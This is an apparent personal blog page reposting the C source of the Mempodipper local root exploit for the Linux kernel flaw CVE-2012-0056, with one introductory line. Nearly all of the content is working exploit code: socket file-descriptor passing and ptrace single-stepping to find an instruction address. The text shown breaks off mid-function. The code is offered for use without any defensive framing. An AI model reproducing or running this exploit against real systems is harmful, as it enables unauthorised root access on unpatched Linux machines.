

<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

      <title>@xjump</title>

      
        <link rel="alternate" type="application/rss+xml" title="RSS" href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">
      

      
          <script src="/slideout/1.0.1/slideout.min.js"></script>
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css">

          <script defer src="/katex/0.10.1/katex.min.js" ></script>
          <script defer src="/katex/0.10.1/contrib/mathtex-script-type.min.js" ></script>
              
          <script defer src="/katex/0.10.1/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
              
          
      

      
          <link rel="stylesheet" href="https:&#x2F;&#x2F;xjump.me&#x2F;site.css">
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css"  >
          
      

      
      
    </head>

    <body>
        <div class="container">

            <div id="mobile-navbar" class="mobile-navbar">
              <div class="mobile-header-logo">
                <a href="/" class="logo">@xjump</a>
              </div>
              <div class="mobile-navbar-icon icon-out">
                <span></span>
                <span></span>
                <span></span>
              </div>
            </div>

            <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
              <ul class="mobile-menu-list">
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me">
                            Home
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me&#x2F;categories">
                            Categories
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me&#x2F;tags&#x2F;all">
                            Archive
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me&#x2F;rss.xml">
                            RSS
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https://xjump.me&#x2F;about">
                            About
                        </a>
                    </li>
                
              </ul>
            </nav>

            <header id="header">
                <div class="logo"><a href="https:&#x2F;&#x2F;xjump.me">@xjump</a></div>
                <nav class="menu">
                    <ul>
                        
                            <li>
                                <a href="https://xjump.me">
                                    Home
                                </a>
                            </li>
                        
                            <li>
                                <a href="https://xjump.me&#x2F;categories">
                                    Categories
                                </a>
                            </li>
                        
                            <li>
                                <a href="https://xjump.me&#x2F;tags&#x2F;all">
                                    Archive
                                </a>
                            </li>
                        
                            <li>
                                <a href="https://xjump.me&#x2F;rss.xml">
                                    RSS
                                </a>
                            </li>
                        
                            <li>
                                <a href="https://xjump.me&#x2F;about">
                                    About
                                </a>
                            </li>
                        
                    </ul>
                </nav>
            </header>

            <main>
                <div class="content" id="mobile-panel">
                    



<article class="post">
    
    <header class="post__header">
        <h1 class="post__title">
            <a href="https:&#x2F;&#x2F;xjump.me&#x2F;local-exploit-cve2012-0056&#x2F;">CVE-2012-0056</a>
        </h1>
        <div class="post__meta">
            <span class="post__time">2013-01-06</span>
            
        </div>
    </header>

    <div class="post-content">
      <p>
    Local exploit for linux kernel >= 2.6.39, x64 and x86.
</p>
<p><a name="continue-reading"></a></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* Mempodipper</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* by zx2c4</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* </span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* Linux Local Root Exploit</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* </span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* Rather than put my write up here, per usual, this time I&#39;ve put it</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* in a rather lengthy blog post: http://blog.zx2c4.com/749</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* </span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* Enjoy.</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* </span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* - zx2c4</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* Jan 21, 2012</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* </span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">* CVE-2012-0056</span><span style="color:#65737e;">
</span><span style="color:#65737e;"> </span><span style="color:#65737e;">*/</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_LARGEFILE64_SOURCE</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/un.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/wait.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/user.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ptrace.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/reg.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">limits.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*prog_name;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">send_fd</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">sock</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">fd</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iovec iov;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msghdr msg;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> cmsghdr *cmsg;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> n;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> cms[</span><span style="color:#bf616a;">CMSG_SPACE</span><span style="color:#c0c5ce;">(sizeof(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">))];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">buf[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">iov.</span><span style="color:#bf616a;">iov_base </span><span style="color:#c0c5ce;">= buf;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">iov.</span><span style="color:#bf616a;">iov_len </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;msg, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof msg);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_iov </span><span style="color:#c0c5ce;">= &amp;iov;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_iovlen </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_control </span><span style="color:#c0c5ce;">= (caddr_t)cms;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_controllen </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">CMSG_LEN</span><span style="color:#c0c5ce;">(sizeof(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">cmsg = </span><span style="color:#bf616a;">CMSG_FIRSTHDR</span><span style="color:#c0c5ce;">(&amp;msg);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">cmsg-&gt;</span><span style="color:#bf616a;">cmsg_len </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">CMSG_LEN</span><span style="color:#c0c5ce;">(sizeof(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">cmsg-&gt;</span><span style="color:#bf616a;">cmsg_level </span><span style="color:#c0c5ce;">= SOL_SOCKET;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">cmsg-&gt;</span><span style="color:#bf616a;">cmsg_type </span><span style="color:#c0c5ce;">= SCM_RIGHTS;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memmove</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">CMSG_DATA</span><span style="color:#c0c5ce;">(cmsg), &amp;fd, sizeof(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((n = </span><span style="color:#bf616a;">sendmsg</span><span style="color:#c0c5ce;">(sock, &amp;msg, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)) != iov.</span><span style="color:#bf616a;">iov_len</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">(sock);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">recv_fd</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">sock</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> n;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iovec iov;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msghdr msg;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> cmsghdr *cmsg;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> cms[</span><span style="color:#bf616a;">CMSG_SPACE</span><span style="color:#c0c5ce;">(sizeof(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">))];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">iov.</span><span style="color:#bf616a;">iov_base </span><span style="color:#c0c5ce;">= buf;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">iov.</span><span style="color:#bf616a;">iov_len </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;msg, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof msg);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_name </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_namelen </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_iov </span><span style="color:#c0c5ce;">= &amp;iov;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_iovlen </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_control </span><span style="color:#c0c5ce;">= (caddr_t)cms;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">msg.</span><span style="color:#bf616a;">msg_controllen </span><span style="color:#c0c5ce;">= sizeof cms;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((n = </span><span style="color:#bf616a;">recvmsg</span><span style="color:#c0c5ce;">(sock, &amp;msg, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(n == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">cmsg = </span><span style="color:#bf616a;">CMSG_FIRSTHDR</span><span style="color:#c0c5ce;">(&amp;msg);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memmove</span><span style="color:#c0c5ce;">(&amp;fd, </span><span style="color:#bf616a;">CMSG_DATA</span><span style="color:#c0c5ce;">(cmsg), sizeof(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">(sock);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> fd;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">unsigned long </span><span style="color:#8fa1b3;">ptrace_address</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Creating ptrace pipe.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">pipe</span><span style="color:#c0c5ce;">(fd);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">fcntl</span><span style="color:#c0c5ce;">(fd[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], F_SETFL, O_NONBLOCK);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Forking ptrace child.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> child = </span><span style="color:#bf616a;">fork</span><span style="color:#c0c5ce;">();</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(child) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">(fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Waiting for ptraced child to give output on syscalls.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(;;) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">wait</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">read</span><span style="color:#c0c5ce;">(fd[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], &amp;buf, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ptrace</span><span style="color:#c0c5ce;">(PTRACE_SYSCALL, child, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Error message written. Single stepping to find address.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> user_regs_struct regs;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(;;) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ptrace</span><span style="color:#c0c5ce;">(PTRACE_SINGLESTEP, child, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">wait</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ptrace</span><span style="color:#c0c5ce;">(PTRACE_GETREGS, child, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, &amp;regs);</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#if defined</span><span style="color:#c0c5ce;">(__i386__)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">instruction_pointer regs.</span><span style="color:#bf616a;">eip</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">upper_bound </span><span style="color:#d08770;">0xb0000000</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#elif defined</span><span style="color:#c0c5ce;">(__x86_64__)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">instruction_pointer regs.</span><span style="color:#bf616a;">rip</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">upper_bound </span><span style="color:#d08770;">0x700000000000</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#else</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#error </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">That platform is not supported.</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#endif</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(instruction_pointer &lt; upper_bound) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> instruction = </span><span style="color:#bf616a;">ptrace</span><span style="color:#c0c5ce;">(PTRACE_PEEKTEXT, child, instruction_pointer, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((instruction &amp; </span><span style="color:#d08770;">0xffff</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0x25ff </span><span style="color:#65737e;">/* jmp r/m32 */</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">                    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> instruction_pointer;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Ptrace_traceme&#39;ing process.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ptrace</span><span style="color:#c0c5ce;">(PTRACE_TRACEME, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] ptrace</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">(fd[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">dup2</span><span style="color:#c0c5ce;">(fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
